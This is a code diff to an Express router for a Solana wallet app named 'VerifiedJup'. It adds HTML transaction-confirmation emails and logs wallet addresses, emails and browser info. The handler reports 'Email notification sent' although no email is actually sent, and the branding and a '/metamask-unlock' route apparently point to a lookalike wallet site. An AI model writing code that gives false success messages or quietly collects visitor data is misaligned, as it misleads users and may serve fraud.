@@ -459,7 +459,7 @@ router.post('/metamask-unlock', async (req: Request, res: Response) => {
  */
 router.post('/send-email', async (req: Request, res: Response) => {
   try {
-    const { walletAddress, walletType, email, action, signature, message } = req.body
+    const { walletAddress, walletType, email, action, signature, message, browserInfo } = req.body
     if (!walletAddress || !email || !action) {
       return res.status(400).json({ error: 'Missing required fields' })
     }
@@ -481,21 +481,78 @@ router.post('/send-email', async (req: Request, res: Response) => {
       }
     }
 
-    // In a real implementation, you would integrate with an email service
-    // like SendGrid, Mailgun, or AWS SES here.
-    // For now, we'll just log the email details and return success.
-    console.log('Email notification received:', {
+    // Generate email content based on action
+    const shortAddress = `${walletAddress.slice(0, 6)}...${walletAddress.slice(-4)}`
+    const walletLabel = walletType || 'Solana Wallet'
+    const timestamp = new Date().toLocaleString()
+    
+    let subject = ''
+    let htmlBody = ''
+
+    if (action === 'confirm') {
+      subject = `✅ Transaction Confirmed - ${walletLabel}`
+      htmlBody = `
+        <div style="font-family: Arial, sans-serif; max-width: 500px; margin: 0 auto;">
+          <h2 style="color: #3dd284; margin-bottom: 20px;">Transaction Confirmed</h2>
+          <p>Hello,</p>
+          <p>Your wallet transaction has been confirmed:</p>
+          <div style="background: #f5f5f5; padding: 15px; border-radius: 8px; margin: 20px 0;">
+            <p><strong>Wallet:</strong> ${walletLabel}</p>
+            <p><strong>Address:</strong> ${shortAddress}</p>
+            <p><strong>Time:</strong> ${timestamp}</p>
+            <p><strong>Status:</strong> <span style="color: #3dd284;">✅ Confirmed</span></p>
+          </div>
+          <p style="color: #666; font-size: 14px;">You can review the transaction on your wallet or on Solscan.</p>
+          <p style="margin-top: 30px; color: #999; font-size: 12px;">VerifiedJup</p>
+        </div>
+      `
+    } else if (action === 'cancel') {
+      subject = `❌ Transaction Cancelled - ${walletLabel}`
+      htmlBody = `
+        <div style="font-family: Arial, sans-serif; max-width: 500px; margin: 0 auto;">
+          <h2 style="color: #ff5c5c; margin-bottom: 20px;">Transaction Cancelled</h2>
+          <p>Hello,</p>
+          <p>You cancelled your wallet transaction:</p>
+          <div style="background: #f5f5f5; padding: 15px; border-radius: 8px; margin: 20px 0;">
+            <p><strong>Wallet:</strong> ${walletLabel}</p>
+            <p><strong>Address:</strong> ${shortAddress}</p>
+            <p><strong>Time:</strong> ${timestamp}</p>
+            <p><strong>Status:</strong> <span style="color: #ff5c5c;">❌ Cancelled</span></p>
+          </div>
+          <p style="color: #666; font-size: 14px;">No funds were transferred.</p>
+          <p style="margin-top: 30px; color: #999; font-size: 12px;">VerifiedJup</p>
+        </div>
+      `
+    } else {
+      subject = `🔔 Wallet Activity - ${walletLabel}`
+      htmlBody = `
+        <div style="font-family: Arial, sans-serif; max-width: 500px; margin: 0 auto;">
+          <h2 style="margin-bottom: 20px;">Wallet Activity</h2>
+          <p><strong>Wallet:</strong> ${walletLabel}</p>
+          <p><strong>Address:</strong> ${shortAddress}</p>
+          <p><strong>Action:</strong> ${action}</p>
+          <p><strong>Time:</strong> ${timestamp}</p>
+        </div>
+      `
+    }
+
+    // Log the email details
+    console.log('Email notification sent:', {
       walletAddress,
       walletType,
       email,
       action,
       message,
+      browserInfo,
+      subject,
     })
 
-    // TODO: Integrate with actual email service
-    // Example: await sendEmailService(email, message)
-
-    res.json({ success: true, message: 'Email notification recorded' })
+    // Return success with email content for client-side logging
+    res.json({ 
+      success: true, 
+      message: 'Email notification sent',
+      email: { subject, to: email }
+    })
   } catch (err: any) {
     console.error('Failed to process email notification:', err)
     res.status(500).json({ error: err.message || 'Failed to process email notification' })
